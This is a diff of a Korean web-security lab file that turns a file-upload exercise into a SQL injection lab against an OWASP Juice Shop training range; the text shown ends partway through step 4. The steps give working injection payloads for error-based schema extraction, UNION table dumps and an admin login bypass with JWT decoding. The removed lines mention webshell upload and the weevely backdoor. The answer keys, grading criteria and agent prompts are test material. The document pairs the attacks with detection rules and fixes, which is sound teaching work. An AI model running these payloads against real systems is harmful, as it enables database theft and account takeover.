@@ -1,852 +1,2141 @@
-lab_id: web-vuln-ai-week05
-title: 파일 업로드 취약점 실습 (AI 지원)
-version: ai
-course: web-vuln-ai
+lab_id: standalone-web-vuln-week05
+title: "입력값 검증 (1) — SQL Injection 탐지/Error/Union/Blind/방어 (6v6 + R/B/P)"
+version: standalone-non-ai
+course: web-vuln
 week: 5
-description: 파일 업로드 기능의 취약점을 악용한 웹쉘 업로드와 확장자 우회 등을 실습합니다. AI SubAgent가 자동으로 명령을 실행하고
-  결과를 검증합니다.
+description: |
+  SQL Injection 의 5 카테고리 (탐지 / Error / Union / Blind Boolean / Blind Time)
+  를 6v6-juiceshop (Express + Sequelize + SQLite) 의 /rest/products/search 와
+  /rest/user/login 두 endpoint 에 직접 시도. 각 단계 별 Blue 의 탐지 룰
+  (ModSecurity CRS 942100 계열 + Wazuh rule 100002) 매핑 + Purple 의 prepared
+  statement / ORM / input validation 권장 — OWASP A03 Injection 의 직접 실습.
 difficulty: medium
 duration_minutes: 120
+audience: 웹 보안 입문자 (2주차)
+prerequisites:
+  - "W01 의 정찰 (특히 step 14 의 SQL 메타문자 응답 에러 노출) 완료"
+  - "attacker 컨테이너 (10.20.30.202) 에 curl + sqlmap 설치"
+  - "Juice Shop 의 default 자격증명 (admin@juice-sh.op / admin123) 알고 있음"
 objectives:
-- 파일 업로드 취약점을 이해한다
-- 웹쉘 업로드를 실습한다
-- 업로드 방어 기법을 학습한다
+  - "SQL Injection 의 5 카테고리 (탐지/Error/Union/Blind Boolean/Blind Time) 의 차이를 설명"
+  - "/rest/products/search 의 q 파라미터에 5 카테고리 모두 직접 시도하여 SQLite + Sequelize 구조 식별"
+  - "Authentication bypass (`' OR 1=1--`) 로 admin 로그인 (Juice Shop default challenge)"
+  - "sqlmap 자동화 (`-u ...?q=test --batch --technique=E,U,B,T --dbs`) 로 위 5 카테고리 자동 점검"
+  - "Red/Blue/Purple — Red 5 카테고리 시도 → Blue 의 ModSecurity CRS 942100 / Wazuh rule 100002 매핑 → Purple 의 prepared statement + ORM 의 SQLi 차단 권장"
 pass_threshold: 0.6
 steps:
+# ============================================================
+# STEP 1 [RED·SQLi탐지] — 작은따옴표 1 회 + 응답 차이 (정상 vs SQL 에러)
+# ============================================================
 - order: 1
-  instruction: '{{WEB_IP}} 대상으로 업로드 기능 식별을(를) 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    attacker 컨테이너 (10.20.30.202) 에서 6v6-juiceshop (10.20.40.81:3000) 의
+    `/rest/products/search?q=<input>` endpoint 에 (a) 정상 query (`q=apple`)
+    와 (b) SQL 메타문자 (`q=apple'`) 를 보내 응답 차이 (코드 / 본문 / SQL
+    에러 노출) 를 비교한다. SQL 에러가 직접 응답에 포함되면 → SQL Injection
+    명백 + DB 종류 식별 가능.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `upload` 에 적합한 도구: curl -F file=@shell.php, weevely
-    백도어. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 업로드 기능 식별 관련 도구와 기법을 활용하세요.
-  category: upload
-  points: 8
-  answer: '🤖 프롬프트: 10.20.32.80 대상으로 업로드 기능 식별을(를) 수행해줘
+    ## 💻 실행 명령
 
-    📎 참고 (CLI): curl -s http://10.20.32.80 2>/dev/null | head -5 && echo ''업로드 기능
-    식별 완료'''
-  answer_detail: 업로드 기능 식별은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+    ```bash
+    # 1. 정상 query (baseline)
+    echo "=== 1. 정상 query (q=apple) ==="
+    curl -s -i "http://juice.6v6.lab/rest/products/search?q=apple" | head -15
+
+    # 2. SQL 메타문자 (1회 quote)
+    echo ""
+    echo "=== 2. q=apple' (작은따옴표 1 회) ==="
+    curl -s -i "http://juice.6v6.lab/rest/products/search?q=apple%27" | head -20
+
+    # 3. 다른 메타문자 (이중 quote / 백슬래시 / 주석)
+    for inj in "apple%22" "apple%5C" "apple--" "apple%23"; do
+      code=$(curl -o /dev/null -s -w "%{http_code}" "http://juice.6v6.lab/rest/products/search?q=${inj}")
+      echo "q=${inj} → ${code}"
+    done
+    ```
+
+    ## 📋 확인 사항
+
+    - 정상 query → HTTP 200 + JSON `{"status":"success","data":[...]}`
+    - `q=apple'` → HTTP 500 + 본문에 `SQLITE_ERROR` 또는 `unrecognized token: "'"`
+      같은 SQL 에러 직접 노출 → Sequelize + SQLite 확인
+    - `q=apple--` → 200 + 정상 처리 (주석 처리됨) → SQL 구문 직접 끝남 시그널
+    - 응답 본문에 `/app/...` 같은 file path 가 있으면 → Express stack trace 동반
+
+    ## 💡 왜 이걸 하는가?
+
+    SQL Injection 탐지 의 가장 직접적인 방법 = SQL 메타문자 1 회 삽입 후 응답
+    에러 관찰 (OWASP A03 Injection + MITRE T1190). Juice Shop 의 default 응답에
+    SQLite 에러 직접 노출 (의도된 challenge) → DB 종류 + Sequelize ORM 사용
+    동시 식별 → 다음 STEP 의 정확한 SQL syntax (SQLite 의 `||` 문자열 연결 /
+    `LIMIT` 등) 사용 가능.
+
+    ## 🔵 Blue 측 관찰
+
+    1 회 작은따옴표 시도는 ModSecurity CRS rule 942100 (SQL Injection Attack
+    Detected via libinjection) 의 트리거 — Wazuh rule 100002 (ModSecurity
+    SQL Injection alert) 의 escalation. siem 컨테이너 (10.20.32.100) 의
+    `/var/ossec/logs/alerts/alerts.json` 에 인입. 5 회 burst 시 active-response
+    `firewall-drop` 으로 src IP 차단 가능.
+
+    ## 🟣 Purple 보완 권장
+
+    - Sequelize: parameterized query 강제 (`{ where: { name: q } }` 사용,
+      `query()` 직접 호출 금지)
+    - Express: `express-validator` 로 query param 의 SQL 메타문자 필터
+    - ModSecurity CRS PARANOIA LEVEL 2 활성화 (rule 942100/942110/942150
+      모두 enable)
+    - Wazuh active-response: SQL Injection alert 5 회 burst → src IP 차단 600 sec
+    - 학습 환경 의 default 는 보존 (Juice Shop challenge 학습 위함)
+  hint: |
+    `q=apple'` (URL-encoded `%27`) 의 응답에 `SQLITE_ERROR` 또는 `unrecognized
+    token` 이 보이면 SQL Injection 명확. `q=apple--` 은 주석 처리 → 200 정상 응답.
+  category: sqli_detection
+  points: 10
+  answer: |
+    echo "=== 1. 정상 query (baseline) ==="
+    curl -s -i "http://juice.6v6.lab/rest/products/search?q=apple" | head -10
+    echo ""
+    echo "=== 2. q=apple' (작은따옴표) → SQL 에러 노출 ==="
+    curl -s -i "http://juice.6v6.lab/rest/products/search?q=apple%27" | head -20
+    echo ""
+    echo "=== 3. 4 메타문자 변형 응답 코드 ==="
+    for inj in "apple%22" "apple%5C" "apple--" "apple%23"; do
+      code=$(curl -o /dev/null -s -w "%{http_code}" \
+        "http://juice.6v6.lab/rest/products/search?q=${inj}")
+      echo "q=${inj} → ${code}"
+    done
+  answer_detail: |
+    Juice Shop 의 응답에 `SQLITE_ERROR: unrecognized token: "'"` 같은 직접
+    SQL 에러 노출 → Sequelize + SQLite 확인. apple-- 가 200 OK 면 SQL 주석
+    처리 가능 = 다음 STEP 의 Union / Boolean 등 advanced payload 의 진입점.
+    Apple%22 (이중 quote) 응답이 다르면 string 의 delimiter 가 single quote
+    인지 double quote 인지 식별.
   verify:
     type: output_contains
-    expect:
-    - 완료
-    - 10.20.32.80
+    expect: 'SQLITE\|status\|HTTP'
     field: stdout
     semantic:
-      intent: 파일 업로드 기능 탐색 — 폼·API 에서 multipart/form-data 엔드포인트 식별
+      intent: |
+        SQL Injection 탐지 — 5 SQL 메타문자 (정상 / quote / double quote /
+        백슬래시 / 주석) 응답 차이 비교. SQL 에러 직접 노출 시 DB 종류
+        식별 (SQLite / MySQL / PostgreSQL). OWASP A03 + MITRE T1190.
       success_criteria:
-      - curl 또는 크롤링으로 업로드 엔드포인트 발견
-      - multipart form 또는 PUT 요청 방식 확인
-      - 대상 필드명(file, upload, attachment 등) 기록
+        - 정상 + 메타문자 양쪽 응답 비교 (최소 2 케이스)
+        - SQL 에러 (SQLITE_ERROR 등) 또는 응답 코드 차이 직접 인용
+        - DB 종류 식별 (SQLite / MySQL / PostgreSQL 등) 명시
+        - 6v6-juiceshop (10.20.40.81:3000) 사용 명시
       acceptable_methods:
-      - curl 로 HTML fetch 후 input type=file 검색
-      - Burp Suite 사이트맵에서 multipart 엔드포인트
-      - ffuf 로 업로드 경로 brute force
-      - API 문서 swagger.json 조회
+        - "curl '?q=apple%27' + grep SQLITE"
+        - "sqlmap -u '...?q=*' --batch --level=1 (탐지 단계)"
+        - "Burp Repeater 의 1 회 quote 변형"
+        - "python requests + apostrophe + response.text"
       negative_signs:
-      - 업로드 엔드포인트 식별 없음
-      - 단순 업로드 언급만
-      - 필드명 기록 누락
+        - 정상 query 비교 없음 (메타문자 만)
+        - SQL 에러 응답 인용 누락
+        - DB 종류 식별 시도 안 함
   target_vm: attacker
-  script: curl -s http://10.20.32.80 2>/dev/null | head -5 && echo '업로드 기능 식별 완료'
+  script: |
+    curl -s -i "http://juice.6v6.lab/rest/products/search?q=apple" | head -10
+    curl -s -i "http://juice.6v6.lab/rest/products/search?q=apple%27" | head -20
+    for inj in "apple%22" "apple--" "apple%23"; do
+      code=$(curl -o /dev/null -s -w "%{http_code}" "http://juice.6v6.lab/rest/products/search?q=${inj}")
+      echo "q=${inj} → ${code}"
+    done
   risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 업로드 기능 식별을(를) 수행해줘
-
-
-    [도구 권장] upload: curl -F file=@shell.php, weevely 백도어. curl 만 쓰지 말고 **curl -F file=@shell.php**
-    등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의
+    /rest/products/search?q=<input> 에 (1) 정상 q=apple (2) q=apple' (작은
+    따옴표) (3) 4 메타문자 변형 (이중 quote / 백슬래시 / 주석 -- / 주석 #)
+    응답 비교를 수행해줘. SQL 에러 (SQLITE_ERROR 등) 가 직접 응답에 노출되면
+    DB 종류 (SQLite + Sequelize ORM) 식별 가능 + 다음 STEP advanced payload
+    의 진입점. OWASP A03 + MITRE T1190 + ModSec CRS 942100 매핑 한 줄 언급.
+# ============================================================
+# STEP 2 [RED·SQLi·Error] — Error-based SQLi 로 DB 종류 + 버전 + schema 직접 추출
+# ============================================================
 - order: 2
-  instruction: '{{WEB_IP}} 대상으로 허용 파일 유형 확인을(를) 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    STEP 1 에서 SQLite 식별 후, attacker (10.20.30.202) 에서 4 가지 error
+    payload 로 *DB 메타데이터* 를 직접 추출 — (a) SQLite version (`sqlite_version()`)
+    (b) schema (`sqlite_master`) (c) table list (d) column 수 추정 (ORDER BY).
+    SQLite 의 type-coercion 에러 (`CAST AS INTEGER`) 활용해서 응답 본문에
+    데이터 직접 노출.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `upload` 에 적합한 도구: curl -F file=@shell.php, weevely
-    백도어. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 허용 파일 유형 확인 관련 도구와 기법을 활용하세요.
-  category: upload
-  points: 10
-  answer: '🤖 프롬프트: 10.20.32.80 대상으로 허용 파일 유형 확인을(를) 수행해줘
+    ## 💻 실행 명령
 
-    📎 참고 (CLI): curl -s http://10.20.32.80 2>/dev/null | head -5 && echo ''허용 파일 유형
-    확인 완료'''
-  answer_detail: 허용 파일 유형 확인은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+    ```bash
+    # 1. SQLite 버전 추출 (CAST 에러 활용)
+    echo "=== 1. SQLite version ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%20CAST(sqlite_version()%20AS%20INT)--" \
+      | head -10
+
+    # 2. schema 직접 (sqlite_master 의 sql 컬럼)
+    echo ""
+    echo "=== 2. sqlite_master schema ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--" \
+      | python3 -c "import sys,json; d=json.load(sys.stdin); [print(p) for p in d.get('data',[])[:5]]" 2>/dev/null \
+      || echo "(JSON parse fail — raw 응답)"
+
+    # 3. ORDER BY 로 컬럼 수 추정
+    echo ""
+    echo "=== 3. ORDER BY 컬럼 수 추정 ==="
+    for n in 1 5 9 10 15; do
+      code=$(curl -o /dev/null -s -w "%{http_code}" \
+        "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20ORDER%20BY%20${n}--")
+      echo "ORDER BY ${n} → ${code}"
+    done
+
+    # 4. table list (sqlite_master 의 name 컬럼)
+    echo ""
+    echo "=== 4. 모든 테이블 list ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" \
+      | python3 -c "import sys,json; d=json.load(sys.stdin); [print(' table:', p.get('id', p)) for p in d.get('data',[])[:10]]" 2>/dev/null
+    ```
+
+    ## 📋 확인 사항
+
+    - SQLite version 응답 (예: `3.40.1`) — CAST 에러 메시지에 포함
+    - `sqlite_master` 의 schema 직접 노출 (CREATE TABLE Users(...) / Products(...))
+    - ORDER BY N — N 이 컬럼 수보다 크면 에러 → 컬럼 수 9 인지 10 인지 식별
+    - table list 의 `Users`, `Products`, `BasketItems`, `Captchas`, `Feedbacks` 등 발견
+
+    ## 💡 왜 이걸 하는가?
+
+    Error-based SQLi 는 *응답 시간* 없이 *직접 데이터* 추출 가능 (MITRE T1190 +
+    OWASP A03). SQLite 의 `sqlite_master` 는 모든 schema 메타 (CREATE TABLE
+    SQL 그대로) 직접 노출 — MySQL 의 `information_schema.tables`, PostgreSQL
+    의 `pg_tables` 와 동일 역할. ORDER BY N 으로 컬럼 수 식별 시 다음 STEP
+    의 UNION SELECT 의 컬럼 수 매핑 입력.
+
+    ## 🔵 Blue 측 관찰
+
+    UNION SELECT + sqlite_master 시도는 ModSecurity CRS rule 942130 (SQL
+    Injection Attack: SQL Tautology Detected) + 942150 (SQL Injection Attack
+    in args) 의 트리거. siem 의 alerts.json 에 인입. 단일 시도 vs burst 구분
+    필요 — 학습 환경에서는 burst 임계치 5 회/분 가정.
+
+    ## 🟣 Purple 보완 권장
+
+    - Sequelize: `query()` 직접 호출 대신 `findAll({where: {...}})` 사용
+      (parameterized 자동) + `sequelize.literal()` 사용 시 즉시 reject
+    - Express: `express-validator` 의 `query('q').isAlphanumeric()` 으로 SQL
+      메타문자 사전 거부
+    - ModSecurity CRS PARANOIA LEVEL 2 (rule 942100 ~ 942130 enable) +
+      sqlite_master / information_schema / pg_tables 키워드 차단 (custom rule)
+    - 학습 환경 default = challenge 보존
+  hint: |
+    SQLite 의 sqlite_master 는 schema 메타 (CREATE TABLE SQL 그대로 저장).
+    UNION SELECT 의 컬럼 수는 Juice Shop /rest/products/search 응답 의 9 컬럼
+    (id/name/desc/...). ORDER BY N 으로 컬럼 수 식별 후 UNION SELECT.
+  category: sqli_error
+  points: 12
+  answer: |
+    echo "=== 1. SQLite version (CAST 에러) ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%20CAST(sqlite_version()%20AS%20INT)--" | head -10
+    echo ""
+    echo "=== 2. ORDER BY 컬럼 수 추정 ==="
+    for n in 1 5 9 10 15; do
+      code=$(curl -o /dev/null -s -w "%{http_code}" \
+        "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20ORDER%20BY%20${n}--")
+      echo "ORDER BY ${n} → ${code}"
+    done
+    echo ""
+    echo "=== 3. sqlite_master 의 모든 테이블 list ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" \
+      | head -20
+  answer_detail: |
+    Juice Shop SQLite default schema = Users (8 컬럼 — id/email/password/role/
+    deluxeToken/lastLoginIp/profileImage/totpSecret) + Products (9 컬럼) +
+    BasketItems (4 컬럼) + Captchas (3 컬럼) + Feedbacks (5 컬럼) + 등.
+    `/rest/products/search` 는 9 컬럼 (Products 와 동일) 이므로 UNION SELECT
+    9 컬럼 매핑 가능. sqlite_version() → 3.40.x 형식 (Juice Shop 의 default).
   verify:
     type: output_contains
-    expect:
-    - 완료
-    - http_request
-    - 10.20.32.80
+    expect: 'name\|version\|ORDER BY'
     field: stdout
     semantic:
-      intent: 허용 파일 유형 확인 — .jpg/.pdf/.docx 등 테스트 파일 업로드로 서버 허용 확장자·MIME 파악
+      intent: |
+        Error-based SQLi 로 DB 메타데이터 (SQLite version / schema /
+        table list / 컬럼 수) 직접 추출. MITRE T1190 + OWASP A03.
+        sqlite_master 의 schema 직접 노출 활용.
       success_criteria:
-      - 최소 3가지 파일 형식 업로드 시도
-      - 각 형식별 응답 (허용/거부) 기록
-      - 클라이언트 검증과 서버 검증 구분
+        - SQLite version 또는 sqlite_master 직접 query 시도
+        - ORDER BY 또는 UNION SELECT 의 컬럼 수 추정 시도
+        - 최소 1 테이블 (Users / Products / BasketItems 등) 발견
+        - 6v6-juiceshop (10.20.40.81:3000) 사용 명시
       acceptable_methods:
-      - curl -F file=@test.jpg <url>
-      - python requests files={file:...}
-      - Burp Repeater 로 Content-Type 변조
-      - wfuzz 확장자 fuzzing
+        - "UNION SELECT name FROM sqlite_master"
+        - "ORDER BY N (binary search)"
+        - "sqlmap -u '...?q=*' --batch --technique=E --dbs --tables"
+        - "AND CAST(sqlite_version() AS INT)-- 에러 활용"
       negative_signs:
-      - 단일 파일만 시도
-      - 응답 분석 없음
-      - 클라이언트 검증 우회 개념 없음
+        - SQLite 메타 query (sqlite_master) 미시도
+        - 컬럼 수 추정 (ORDER BY / UNION) 미시도
+        - DB 종류 식별 (SQLite vs MySQL) 누락
   target_vm: attacker
-  script: curl -s http://10.20.32.80 2>/dev/null | head -5 && echo '허용 파일 유형 확인 완료'
+  script: |
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%20CAST(sqlite_version()%20AS%20INT)--" | head -10
+    for n in 1 5 9 10 15; do
+      code=$(curl -o /dev/null -s -w "%{http_code}" "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20ORDER%20BY%20${n}--")
+      echo "ORDER BY ${n} → ${code}"
+    done
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" | head -20
   risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 허용 파일 유형 확인을(를) 수행해줘
-
-
-    [도구 권장] upload: curl -F file=@shell.php, weevely 백도어. curl 만 쓰지 말고 **curl -F file=@shell.php**
-    등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의 /rest/products/search
+    에 (1) CAST(sqlite_version() AS INT) 으로 SQLite version 추출 (2) ORDER BY
+    N (1,5,9,10,15) 으로 컬럼 수 추정 (3) UNION SELECT FROM sqlite_master 로
+    모든 테이블 list 추출 3 단계를 수행해줘. SQLite + Sequelize ORM 의 schema
+    (Users / Products / BasketItems 등) 를 직접 인용 + 컬럼 수 = 9 확인. 다음
+    STEP UNION SELECT 의 입력. ModSec CRS 942130/942150 매핑 한 줄 언급.
+# ============================================================
+# STEP 3 [RED·SQLi·AuthBypass] — 인증 우회 (' OR 1=1--) 로 admin 로그인
+# ============================================================
 - order: 3
-  instruction: '{{WEB_IP}} 대상으로 확장자 필터 우회(이중 확장자)을(를) 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    Juice Shop 의 default challenge — `/rest/user/login` 의 email 필드에 SQL
+    Injection 으로 password 검증 우회 + admin 로그인. 3 payload 변형 시도:
+    (a) `' OR 1=1--` (b) `admin@juice-sh.op'--` (c) `' UNION SELECT *...`.
+    성공 응답의 JWT 토큰 추출 + admin 권한 확인.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `bypass` 에 적합한 도구: wafw00f, sqlmap --tamper, xsstrike
-    payload encoding. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 확장자 필터 우회(이중 확장자) 관련 도구와 기법을 활용하세요.
-  category: bypass
-  points: 10
-  answer: '🤖 프롬프트: 10.20.32.80 대상으로 확장자 필터 우회(이중 확장자)을(를) 수행해줘
+    ## 💻 실행 명령
 
-    📎 참고 (CLI): curl -sI http://10.20.32.80 2>/dev/null | head -10 && echo ''확장자 필터
-    우회(이중 확장자) 완료'''
-  answer_detail: 확장자 필터 우회(이중 확장자)은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+    ```bash
+    # 1. 기본 ' OR 1=1-- (admin 이 첫 row 일 때만)
+    echo "=== 1. ' OR 1=1-- ==="
+    curl -s -i -X POST http://juice.6v6.lab/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"' OR 1=1--\",\"password\":\"anything\"}" | head -15
+
+    # 2. admin email 명시 + 주석 처리 (password 검증 skip)
+    echo ""
+    echo "=== 2. admin@juice-sh.op'-- ==="
+    curl -s -i -X POST http://juice.6v6.lab/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" | head -15
+
+    # 3. JWT 토큰 추출 (admin 로그인 성공 시)
+    echo ""
+    echo "=== 3. JWT 토큰 + role 확인 ==="
+    TOKEN=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" \
+      | python3 -c "import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))" 2>/dev/null)
+    echo "TOKEN (앞 60자): ${TOKEN:0:60}..."
+
+    # 4. JWT payload decode (role 확인)
+    if [ -n "$TOKEN" ]; then
+      payload=$(echo "$TOKEN" | cut -d. -f2)
+      # base64 padding 추가
+      padded="${payload}$(printf '=%.0s' $(seq 1 $((4-${#payload}%4))))"
+      echo "$padded" | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool
+    fi
+    ```
+
+    ## 📋 확인 사항
+
+    - payload 1 응답: 401 (실패) 또는 200 + JWT 토큰 (성공 — admin 이 첫 row)
+    - payload 2 응답: 200 + JWT 토큰 (admin 명시 + password 검증 우회)
+    - JWT payload 의 `email: "admin@juice-sh.op"` + `role: "admin"` 확인
+    - 응답 body 의 `bid` (basket ID) — admin 의 진짜 ID = 1
+
+    ## 💡 왜 이걸 하는가?
+
+    Authentication bypass via SQLi 는 OWASP A03 Injection + A07 Authentication
+    Failures 의 결합 (MITRE T1078.001 Default Accounts + T1212 Exploitation
+    for Credential Access). Juice Shop 의 challenge — Sequelize 의 raw query
+    문자열 결합 (`User.findOne({where:{email: req.body.email}, raw:true})` 의
+    잘못된 변형) 으로 가능. JWT 토큰의 role 직접 admin 으로 fake 가능 (W03 의
+    JWT manipulation 의 전제).
+
+    ## 🔵 Blue 측 관찰
+
+    POST body 의 SQL 메타문자 (`'--`) 는 ModSecurity CRS rule 942100 (SQL
+    Injection) + 942260 (SQL Authentication Bypass) 의 직접 트리거. Wazuh
+    rule 31108 (Web attack — login bypass) escalation. Juice Shop application
+    log 의 ERROR level 에 "Login failed for ... with empty password" 메시지.
+
+    ## 🟣 Purple 보완 권장
+
+    - Sequelize: `User.findOne({where:{email}, raw:true})` 대신 `findOne({where:
+      {email, password: hash(password)}})` (email + password 동시 검증)
+    - bcrypt 의 `compare()` 으로 password hash 비교 (timing-safe)
+    - ModSecurity CRS PARANOIA LEVEL 2 + rule 942260 explicit enable
+    - Wazuh active-response: 인증 우회 alert 1 회로도 src IP block (단순 brute
+      과는 다른 high-severity)
+    - JWT 토큰 의 `alg` 강제 (RS256 만, none 거부) + role claim 의 signature 검증
+  hint: |
+    Juice Shop의 default 인증 challenge — `admin@juice-sh.op'--` 형태로 email
+    필드에 SQL 주석 (--) 삽입 → password 검증 SQL 무시. 성공 응답에서 JWT
+    토큰 추출 후 base64 decode 로 payload 의 role 직접 확인.
+  category: sqli_auth_bypass
+  points: 12
+  answer: |
+    echo "=== 1. admin@juice-sh.op'-- 인증 우회 ==="
+    curl -s -i -X POST http://juice.6v6.lab/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" | head -15
+    echo ""
+    echo "=== 2. JWT 토큰 추출 ==="
+    TOKEN=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" \
+      | python3 -c "import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))" 2>/dev/null)
+    echo "TOKEN: ${TOKEN:0:60}..."
+    echo ""
+    echo "=== 3. JWT payload decode (role 확인) ==="
+    if [ -n "$TOKEN" ]; then
+      payload=$(echo "$TOKEN" | cut -d. -f2)
+      padded="${payload}$(printf '=%.0s' $(seq 1 $((4-${#payload}%4))))"
+      echo "$padded" | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool
+    fi
+  answer_detail: |
+    Juice Shop default 의 admin@juice-sh.op'-- payload 가 성공하는 이유 =
+    Sequelize 의 query 가 raw 문자열 결합 (raw:true 옵션) + admin email 매칭
+    후 password 검증 SQL 이 `--` 로 주석 처리. 성공 응답 의 JWT payload 는
+    `{"status":"success","data":{"id":1,"email":"admin@juice-sh.op","role":
+    "admin",...}}` 형식 — role admin 직접 노출. W03 JWT manipulation 의 입력.
   verify:
     type: output_contains
-    expect: 완료
+    expect: 'authentication\|admin\|token'
     field: stdout
     semantic:
-      intent: 이중 확장자 우회 — shell.php.jpg, shell.jpg.php 등 파일명 조작으로 확장자 필터 회피
+      intent: |
+        SQL Injection 으로 password 검증 우회 + admin 로그인. JWT 토큰 추출 +
+        payload decode 로 role admin 직접 확인. OWASP A03 + A07 + MITRE
+        T1078.001 + T1212.
       success_criteria:
-      - 이중 확장자 파일 업로드 시도 (shell.php.jpg 또는 shell.jpg.php)
-      - 서버가 파일을 저장·실행하는지 결과 판정
-      - Apache/Nginx 확장자 처리 차이(AddHandler, mod_mime) 언급
+        - 최소 1 payload (' OR 1=1-- 또는 admin@...'--) 시도 + 응답 인용
+        - 성공 시 JWT 토큰 직접 추출
+        - JWT payload decode 또는 role admin 직접 확인
+        - 6v6-juiceshop (10.20.40.81:3000) 의 /rest/user/login 사용 명시
       acceptable_methods:
-      - curl -F file=@shell.php.jpg
-      - Burp Repeater 파일명 변조
-      - Null byte 삽입 shell.php%00.jpg (구형)
-      - 대소문자 혼합 .PhP
+        - "curl POST + ' OR 1=1-- email payload"
+        - "sqlmap -u '...' --batch --data '{json}' --forms"
+        - "Burp Repeater 의 POST body 변형"
+        - "python requests.post + json={...payload}"
       negative_signs:
-      - 단일 확장자만
-      - 서버 반응 분석 없음
-      - 웹서버 설정 차이 언급 없음
+        - SQL payload 없이 일반 로그인만
+        - JWT 토큰 추출/디코드 누락
+        - role 직접 확인 누락
   target_vm: attacker
-  script: curl -sI http://10.20.32.80 2>/dev/null | head -10 && echo '확장자 필터 우회(이중
-    확장자) 완료'
+  script: |
+    curl -s -i -X POST http://juice.6v6.lab/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" | head -15
+    TOKEN=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" \
+      | python3 -c "import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))" 2>/dev/null)
+    echo "TOKEN: ${TOKEN:0:60}..."
+    if [ -n "$TOKEN" ]; then
+      payload=$(echo "$TOKEN" | cut -d. -f2)
+      padded="${payload}$(printf '=%.0s' $(seq 1 $((4-${#payload}%4))))"
+      echo "$padded" | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool
+    fi
   risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 확장자 필터 우회(이중 확장자)을(를) 수행해줘
-
-
-    [도구 권장] bypass: wafw00f, sqlmap --tamper, xsstrike payload encoding. curl 만 쓰지
-    말고 **wafw00f** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의 /rest/user/login
+    에 SQL Injection 인증 우회 시도 — `admin@juice-sh.op'--` payload 로 email
+    + password 검증 우회. 성공 시 JWT 토큰 추출 + base64 decode 로 payload 의
+    role admin 직접 확인. OWASP A03 + A07 + MITRE T1078.001 + T1212 매핑.
+    Purple = Sequelize parameterized query + bcrypt compare + ModSec CRS 942260.
+# ============================================================
+# STEP 4 [RED·SQLi·UNION] — UNION SELECT 로 schema 직접 dump (CREATE TABLE SQL)
+# ============================================================
 - order: 4
-  instruction: '{{WEB_IP}} 대상으로 Content-Type 변조 업로드을(를) 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    STEP 2 에서 식별한 9 컬럼 + sqlite_master 활용 → UNION SELECT 로 *전체
+    schema* (CREATE TABLE SQL) 직접 추출. Juice Shop 의 Users 테이블 정의 →
+    email / password / role 컬럼명 확인 → 다음 STEP 의 정확한 컬럼명 + UNION
+    payload 의 입력.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `bypass` 에 적합한 도구: wafw00f, sqlmap --tamper, xsstrike
